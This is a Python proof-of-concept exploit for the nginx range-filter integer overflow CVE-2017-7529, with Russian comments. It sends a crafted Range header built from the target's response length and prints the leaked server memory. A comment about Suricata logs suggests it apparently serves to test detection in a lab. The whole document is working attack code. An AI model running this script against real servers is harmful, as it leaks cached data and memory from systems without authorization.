#!/usr/bin/env python
import sys
import requests

if len(sys.argv) < 2:
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
    sys.exit()

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
}
offset = 605
url = sys.argv[1]

# Добавляем таймауты для всех запросов
timeout = 10

print(f"[*] Подключение к {url}...")
try:
    response = requests.get(url, headers=headers, timeout=timeout)
    file_len = len(response.content)
    print(f"[+] Получен ответ, размер файла: {file_len} байт")
except requests.exceptions.RequestException as e:
    print(f"[-] Ошибка подключения: {e}")
    sys.exit(1)

n = file_len + offset
headers['Range'] = "bytes=-%d,-%d" % (
    n, 0x8000000000000000 - n)

print(f"[*] Отправка Range запроса...")
print(f"[*] Range заголовок: {headers['Range']}")
try:
    # Используем stream=True и большой таймаут для Range запроса
    # Уязвимость CVE-2017-7529 может обрабатываться долго
    r = requests.get(url, headers=headers, timeout=(10, 60), stream=True)
    print(f"[+] Получен ответ (статус: {r.status_code})")
    
    # Читаем содержимое по частям
    content = b""
    try:
        for chunk in r.iter_content(chunk_size=8192, decode_unicode=False):
            if chunk:
                content += chunk
        print(f"[+] Размер полученного контента: {len(content)} байт")
        print("=" * 60)
        # Пытаемся декодировать как текст
        try:
            text = content.decode('utf-8', errors='ignore')
            print(text)
        except:
            print(content[:1000])  # Выводим первые 1000 байт в hex/raw формате
        print("=" * 60)
    except requests.exceptions.ChunkedEncodingError:
        # Если произошла ошибка при чтении, но ответ начал приходить - это может быть успех
        print(f"[!] Частичный ответ получен: {len(content)} байт")
        if content:
            try:
                print(content.decode('utf-8', errors='ignore'))
            except:
                print(content[:1000])
except requests.exceptions.Timeout as e:
    print(f"[-] Таймаут Range запроса: {e}")
    print("[!] Это может быть нормальным для данной уязвимости - сервер может обрабатывать запрос долго")
    print("[!] Попробуйте проверить логи Suricata для обнаружения атаки")
    # Не завершаем с ошибкой, так как таймаут может быть ожидаемым
    sys.exit(0)
except requests.exceptions.RequestException as e:
    print(f"[-] Ошибка Range запроса: {e}")
    sys.exit(1)
